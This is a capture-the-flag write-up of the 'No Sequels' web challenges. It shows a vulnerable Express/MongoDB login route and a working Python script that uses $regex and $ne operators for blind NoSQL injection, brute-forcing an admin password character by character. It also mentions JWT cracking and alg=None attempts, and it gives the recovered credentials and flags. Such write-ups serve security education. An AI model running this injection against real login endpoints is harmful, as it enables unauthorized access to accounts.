No Sequels & No Sequels 2
========
**Category**: web  **Points**: 50 & 80

Challenge Description
------------
We were directed to a website with the following source code

```
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

...

router.post('/login', verifyJwt, function (req, res) {
    // monk instance
    var db = req.db;

    var user = req.body.username;
    var pass = req.body.password;

    if (!user || !pass){
        res.send("One or more fields were not provided.");
    }
    var query = {
        username: user,
        password: pass
    }

    db.collection('users').findOne(query, function (err, user) {
        if (!user){
            res.send("Wrong username or password");
            return
        }

        res.cookie('token', jwt.sign({name: user.username, authenticated: true}, secret));
        res.redirect("/site");
    });
});
```

Solution
-----------------

The hint `MongoDB is a safer alternative to SQL, right?` points us to MongoDB NoSQL injection.

In a NoSQL injection, we can abuse the operators such as $gt or $ne and perform logical evaluations with the data returned from the database query.

Note: We have to change the Content-Type header to application/json to evaluate JSON data.

![alt text][req.png]

However, I was not able to login because of the JWT token issues. I have tried performing some JWT token attacks using jwt2john.py (https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py)
to crack the token secret, as well as replacing the HS256 algorithm as None however none were successful.

Fortunately, I could still perform a blind injection attack

![alt text][req2.png]

Burp > Copy as Requests and add a loop

```
import requests

burp0_url = "https://nosequels.2019.chall.actf.co:443/login"
burp0_cookies = {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRoZW50aWNhdGVkIjpmYWxzZSwiaWF0IjoxNTU2MTg3MjA0fQ.VPJLL2Cy4893djpyDGaMZ9P_Pv8LOFn8xxH4T4EJWi0"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://nosequels.2019.chall.actf.co/login", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/json"}

chars = "abcdefghijklmnopqrstuvwxyz0123456789_"
password = ''

while 1:
  for i in chars:
    burp0_json={"password": {"$regex": "^" + password + i}, "username": {"$ne": "test"}}
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
    if 'Wrong' not in r.text:
      password += i
      print password
```

We now get the password:
```
# python blind.py 
c
co
con
cong
congr
congra
congrat
congrats
congratsy
congratsyo
congratsyou
congratsyouw
congratsyouwi
congratsyouwin
```

After doing the same with username, we obtain the credentials `admin:congratsyouwin`and were able to login and solve the two challenges.

flag1: `actf{no_sql_doesn't_mean_no_vuln}`

flag2: `actf{still_no_sql_in_the_sequel}`